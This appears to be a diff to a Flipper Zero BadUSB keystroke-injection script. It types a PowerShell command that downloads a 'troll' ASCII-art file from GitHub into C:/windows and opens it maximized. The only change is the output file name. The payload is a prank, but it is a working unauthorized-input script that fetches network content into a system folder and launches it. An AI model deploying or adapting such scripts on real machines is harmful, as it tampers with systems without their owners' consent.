@@ -14,6 +14,6 @@ ENTER
 DELAY 1000
 ENTER
 DELAY 720
-STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/Nota0x7/FlipperZero-Files/main/BadUSB/Ascii%20Database/Resources/Faces/Cool%20troll.txt -OutFile C:/windows/OhHi3323.txt; Start-Process -FilePath "C:/windows/OhHi3323.txt" -WindowStyle maximized
+STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/Nota0x7/FlipperZero-Files/main/BadUSB/Ascii%20Database/Resources/Faces/Cool%20troll.txt -OutFile C:/windows/COolTroll12133.txt; Start-Process -FilePath "C:/windows/COolTroll12133.txt" -WindowStyle maximized
 DELAY 700
 ENTER
